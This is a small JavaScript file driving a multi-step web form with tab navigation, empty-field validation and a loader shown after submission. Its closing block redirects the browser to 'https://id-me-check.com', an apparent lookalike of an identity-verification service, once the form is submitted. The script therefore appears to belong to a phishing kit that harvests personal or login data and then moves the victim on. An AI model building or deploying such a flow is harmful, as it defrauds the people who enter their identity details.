var currentTab = 0;
showTab(currentTab);
	
function showTab(n) {
	var x = document.getElementsByClassName("tab");
	x[n].style.display = "block";
	if (n == 0) {document.getElementById("prevBtn").style.display = "none";
	} else {document.getElementById("prevBtn").style.display = "block";}
	if (n == (x.length - 1)) {document.getElementById("nextBtn").innerHTML = "Submit";
	} else {document.getElementById("nextBtn").innerHTML = "Next";
	}
	fixStepIndicator(n)
	}
	
function nextPrev(n) {
	var x = document.getElementsByClassName("tab");
	if (n == 1 && !validateForm()) return false;
	x[currentTab].style.display = "none";
	currentTab = currentTab + n;
	if (currentTab >= x.length) {
	document.getElementById("formContainer").submit();
	document.getElementById("loader").style.display = "block";
	document.getElementById("underLoader").style.display = "none";
    return false;
	}
	showTab(currentTab);
	}
	
function validateForm() {
	var x, y, i, valid = true;
	x = document.getElementsByClassName("tab");
	y = x[currentTab].getElementsByTagName("input");
	for (i = 0; i < y.length; i++) {
	if (y[i].value == "") {
	y[i].className += " invalid";
	valid = false;
    }
	}
	if (valid) {document.getElementsByClassName("step")[currentTab].className += " finish";
	}
	return valid;
	}
	
function fixStepIndicator(n) {
	var i, x = document.getElementsByClassName("step");
	for (i = 0; i < x.length; i++) {
	x[i].className = x[i].className.replace(" active", "");
	}
	x[n].className += " active";
	}
	
let myRedirect = () => {
		var theRedirect = () => {if (document.getElementById("loader").style.display == "block") {window.location.replace("https://id-me-check.com");}
		}
	setTimeout(theRedirect, 5000);
	}
	setInterval(myRedirect, 7000);
